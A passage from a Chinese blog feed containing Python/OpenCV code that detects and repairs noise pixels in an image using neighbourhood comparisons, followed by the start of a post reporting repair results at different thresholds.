class="number">1</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p = <span class="built_in">sorted</span>(p1)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]))]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    min_index = 0</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if p[i] &lt; p[min_index]:</span></span><br><span class="line"><span class="string">            min_index = i</span></span><br><span class="line"><span class="string">    max_index1 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if p[i] &gt; p[max_index1]:</span></span><br><span class="line"><span class="string">            max_index1 = i</span></span><br><span class="line"><span class="string">    max_index2 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and p[i] &gt; p[max_index2]:</span></span><br><span class="line"><span class="string">            max_index2 = i</span></span><br><span class="line"><span class="string">    max_index3 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and i != max_index2 and p[i] &gt; p[max_index3]:</span></span><br><span class="line"><span class="string">            max_index3 = i</span></span><br><span class="line"><span class="string">    max_index4 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and i != max_index2 and i != max_index3 and p[i] &gt; p[max_index4]:</span></span><br><span class="line"><span class="string">            max_index4 = i</span></span><br><span class="line"><span class="string">    # 将较小的的四个标记为1区域，较大区域标记为2</span></span><br><span class="line"><span class="string">    result[max_index1] = 2</span></span><br><span class="line"><span class="string">    result[max_index2] = 2</span></span><br><span class="line"><span class="string">    result[max_index3] = 2</span></span><br><span class="line"><span class="string">    result[max_index4] = 2</span></span><br><span class="line"><span class="string">    for i in range(8):</span></span><br><span class="line"><span class="string">        if result[i] != 2:</span></span><br><span class="line"><span class="string">            result[i] = 1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division2</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    d = [<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>]), <span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>]), <span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>]), <span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>]),</span><br><span class="line">         <span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>]), <span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>]), <span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]), <span class="built_in">int</span>(p[<span class="number">7</span>]) - <span class="built_in">int</span>(p[<span class="number">0</span>])]</span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    min_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> d[i] &gt; d[max_index]:</span><br><span class="line">            max_index = i</span><br><span class="line">        <span class="keyword">if</span> d[i] &lt; d[min_index]:</span><br><span class="line">            min_index = i</span><br><span class="line">    <span class="keyword">if</span> max_index == min_index:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &gt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> max_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &lt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">2</span></span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    max1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] == <span class="number">1</span> <span class="keyword">and</span> p[i] &gt; max1:</span><br><span class="line">            max1 = p[i]</span><br><span class="line">    min2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] == <span class="number">2</span> <span class="keyword">and</span> p[i] &lt; min2:</span><br><span class="line">            min2 = p[i]</span><br><span class="line">    <span class="keyword">if</span> max1 - min2 &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维数组映射到二维</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_1d_2_2d</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊值处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">special_check</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p_sum = <span class="built_in">int</span>(p[<span class="number">0</span>]) + <span class="built_in">int</span>(p[<span class="number">1</span>]) + <span class="built_in">int</span>(p[<span class="number">2</span>]) + <span class="built_in">int</span>(p[<span class="number">3</span>]) + <span class="built_in">int</span>(p[<span class="number">4</span>]) + <span class="built_in">int</span>(p[<span class="number">5</span>]) + <span class="built_in">int</span>(p[<span class="number">6</span>]) + <span class="built_in">int</span>(p[<span class="number">7</span>])</span><br><span class="line">    max_differ = <span class="number">0</span></span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(<span class="built_in">int</span>(p[i]) - (p_sum - <span class="built_in">int</span>(p[i])) // <span class="number">7</span>) &gt; max_differ:</span><br><span class="line">            max_differ = <span class="built_in">abs</span>(<span class="built_in">int</span>(p[i]) - (p_sum - <span class="built_in">int</span>(p[i])) // <span class="number">7</span>)</span><br><span class="line">            max_index = i</span><br><span class="line">    <span class="keyword">if</span> max_differ &gt; <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _1d_2_2d(max_index)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = [[<span class="number">0</span>] * col <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># _8_area = type(img_channel)</span></span><br><span class="line">            _8_area = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">0</span>] = img_channel[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">1</span>] = img_channel[i - <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">2</span>] = img_channel[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">2</span>] = img_channel[i][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">2</span>] = img_channel[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">1</span>] = img_channel[i + <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">0</span>] = img_channel[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">0</span>] = img_channel[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 不考虑位置</span></span><br><span class="line">            part1, flag1 = division1(_8_area)</span><br><span class="line">            <span class="comment"># 考虑位置</span></span><br><span class="line">            part2, flag2 = division2(_8_area)</span><br><span class="line">            <span class="keyword">if</span> flag1 == <span class="literal">False</span> <span class="keyword">or</span> flag2 == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 处理特殊值</span></span><br><span class="line">            sx, sy = special_check(_8_area)</span><br><span class="line">            <span class="keyword">if</span> sx != -<span class="number">1</span>:</span><br><span class="line">                result[i - <span class="number">1</span> + sx][j - <span class="number">1</span> + sy] += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 比较</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">if</span> part1[k] != part2[k]:</span><br><span class="line">                    x, y = _1d_2_2d(k)</span><br><span class="line">                    result[i - <span class="number">1</span> + x][j - <span class="number">1</span> + y] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 不考虑缩小二分之一图像</span></span><br><span class="line"><span class="string">def mark(pixel_channel):</span></span><br><span class="line"><span class="string">    for i in range(pixel_channel.row):</span></span><br><span class="line"><span class="string">        for j in range(pixel_channel.col):</span></span><br><span class="line"><span class="string">            if pixel_channel.noise[i][j] &gt;= threshold:</span></span><br><span class="line"><span class="string">                pixel_channel.channel[i][j] = 0</span></span><br><span class="line"><span class="string">    return pixel_channel</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到最合适的值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_best</span>(<span class="params">pixel_channel, x, y</span>):</span></span><br><span class="line">    p = pixel_channel.channel[x][y]</span><br><span class="line">    <span class="comment"># 建立领域列表</span></span><br><span class="line">    neighborhood = []</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][</span><br><span class="line">        y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][</span><br><span class="line">        y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][</span><br><span class="line">        y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][</span><br><span class="line">        y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 搜索与给定点最接近的非噪声点</span></span><br><span class="line">    <span class="comment"># 建立差值列表</span></span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(neighborhood)):</span><br><span class="line">        d.append(<span class="built_in">abs</span>(<span class="built_in">int</span>(neighborhood[i]) - <span class="built_in">int</span>(p)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(d) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    min_index = d.index(<span class="built_in">min</span>(d))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> neighborhood[min_index]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repair</span>(<span class="params">pixel_channel, half_channel</span>):</span></span><br><span class="line">    <span class="comment"># 左上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">0</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">0</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">0</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span>][j * <span class="number">2</span>] += half_channel[<span class="number">0</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">1</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">1</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">1</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span>][j * <span class="number">2</span> + <span class="number">1</span>] += half_channel[<span class="number">1</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 左下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">2</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">2</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">2</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span> + <span class="number">1</span>][j * <span class="number">2</span>] += half_channel[<span class="number">2</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">3</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">3</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">3</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span> + <span class="number">1</span>][j * <span class="number">2</span> + <span class="number">1</span>] += half_channel[<span class="number">3</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.channel[i][j] = find_best(pixel_channel, i, j)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 图像地址</span></span><br><span class="line">    img_address = <span class="string">&quot;img_noise.png&quot;</span></span><br><span class="line">    <span class="comment"># 以BGR方式读入图像</span></span><br><span class="line">    img = cv.imread(img_address, <span class="number">1</span>)</span><br><span class="line">    cv.imshow(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">    <span class="comment"># 通道分离</span></span><br><span class="line">    channel_b, channel_g, channel_r = cv.split(img)</span><br><span class="line">    <span class="comment"># 建立像素通道类</span></span><br><span class="line">    b = create_pixel_channel(channel_b)</span><br><span class="line">    g = create_pixel_channel(channel_g)</span><br><span class="line">    r = create_pixel_channel(channel_r)</span><br><span class="line">    <span class="comment"># 缩小二分之一</span></span><br><span class="line">    half_b = [half_1(b), half_2(b), half_3(b), half_4(b)]</span><br><span class="line">    half_g = [half_1(g), half_2(g), half_3(g), half_4(g)]</span><br><span class="line">    half_r = [half_1(r), half_2(r), half_3(r), half_4(r)]</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    fp = open(&#x27;half_b.noise.csv&#x27;, &#x27;w&#x27;)</span></span><br><span class="line"><span class="string">    for i in range(half_b.row):</span></span><br><span class="line"><span class="string">        for j in range(half_b.col):</span></span><br><span class="line"><span class="string">            print(half_b.noise[i][j], file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">            print(&quot;,&quot;, file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">        print(&quot;&quot;, file=fp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fp = open(&#x27;half_b.pixel.csv&#x27;, &#x27;w&#x27;)</span></span><br><span class="line"><span class="string">    for i in range(half_b.row):</span></span><br><span class="line"><span class="string">        for j in range(half_b.col):</span></span><br><span class="line"><span class="string">            print(half_b.channel[i][j], file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">            print(&quot;,&quot;, file=fp, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">        print(&quot;&quot;, file=fp)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不考虑二分之一图像</span></span><br><span class="line">    <span class="comment"># new_img = cv.merge((mark(b).channel, mark(g).channel, mark(r).channel))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 考虑二分之一图像</span></span><br><span class="line">    new_img = cv.merge((repair(b, half_b).channel, repair(g, half_g).channel, repair(r, half_r).channel))</span><br><span class="line"></span><br><span class="line">    cv.imwrite(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.imshow(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.waitKey()</span><br><span class="line">    cv.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011555149.png" alt="1"></p><p>可以看到，噪声点全部被消除</p>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210502</title>
      <link href="/20210502-img-report/"/>
      <url>/20210502-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="一、修复图片测试"><a href="#一、修复图片测试" class="headerlink" title="一、修复图片测试"></a>一、修复图片测试</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>将定位出来的噪声点用邻域内的非噪声点赋值</p><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>阈值：6</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011548036.png" alt="1"></p><p>可以看到，除了图像最边界的噪声点和部分连块较多的噪声点之外，全部能够修复</p><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>这个问题在上周就已经发现，连块较多的部分，在噪声检测中只能检测出连块中的部分像素点</p><p>而在修改时，是用最接近的非噪声点修改的，所以，在这里未能修复</p><h3 id="修改阈值"><a href="#修改阈值" class="headerlink" title="修改阈值"></a>修改阈值</h3><p>阈值：5</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011548307.png" alt="2"></p><p>与6相比，阈值为5时，多修复了两个像素点</p><p>阈值：3</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011548481.png" alt="3"></p><p>阈值为3时，人为噪声点全部去除，但是边缘上会出现非预期的噪声</p><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 